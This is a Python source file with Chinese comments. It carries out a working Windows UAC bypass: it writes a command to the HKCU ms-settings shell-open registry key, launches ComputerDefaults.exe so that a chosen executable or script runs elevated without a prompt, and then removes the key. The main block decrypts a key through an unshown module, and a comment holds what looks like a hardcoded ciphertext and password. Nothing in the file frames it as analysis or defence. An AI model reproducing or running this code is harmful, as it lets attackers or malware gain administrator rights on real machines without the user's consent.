import os
import sys
import ctypes
import shlex
import winreg
import rs1

REG_PATH = r"Software\\Classes\\ms-settings\\Shell\\Open\\command"
EXE_PATH = r"C:\\Windows\\System32\\ComputerDefaults.exe"


def _restore_uac_registry():
    try:
        winreg.DeleteKey(winreg.HKEY_CURRENT_USER, REG_PATH)
        return True
    except FileNotFoundError:
        return True
    except OSError:
        try:
            # 如果单个键删除失败，则删除整个树
            winreg.DeleteKeyEx(winreg.HKEY_CURRENT_USER, REG_PATH)
            return True
        except Exception:
            return False


def _build_uac_command(execute_file: str = None):
    target_path = os.path.abspath(execute_file) if execute_file else os.path.abspath(sys.argv[0])
    if target_path.lower().endswith('.py'):
        args = [shlex.quote(sys.executable), shlex.quote(target_path)]
        if not execute_file and len(sys.argv) > 1:
            args.extend(shlex.quote(arg) for arg in sys.argv[1:])
        return ' '.join(args)
    return shlex.quote(target_path)


def uac_bypass(execute_file: str = None):
    """尝试使用 ms-settings/ComputerDefaults UAC 绕过将指定文件以管理员权限重新启动。

    Args:
        execute_file: 要以管理员权限启动的可执行文件或 Python 脚本路径。
    """
    command = _build_uac_command(execute_file)
    try:
        key = winreg.CreateKeyEx(
            winreg.HKEY_CURRENT_USER,
            REG_PATH,
            0,
            winreg.KEY_WRITE
        )
        winreg.SetValueEx(key, None, 0, winreg.REG_SZ, command)
        winreg.SetValueEx(key, 'DelegateExecute', 0, winreg.REG_SZ, '')
        winreg.CloseKey(key)

        shell32 = ctypes.windll.shell32
        result = shell32.ShellExecuteW(None, None, EXE_PATH, None, None, 1)
        return result > 32
    except Exception:
        return False
    finally:
        _restore_uac_registry()


if __name__ == '__main__':
    encrypted = input("请输入密钥：")  # "le4eKlZwatCQSFYepHp9XzBKlVqJBmx+foRGOz4076w3JFNilgqAUlIvY6ErrsnzjqZIDjvcy4mRIKnYLa7Cwg==:a6eda4f443c9158ee5172bd8489684df422752f898655d0db2139a7dc67dcd77"
    password = input("请输入密码：")  # zzz.8848
    decrypted = rs1.decrypt(encrypted, password)
    print("解密结果:", decrypted)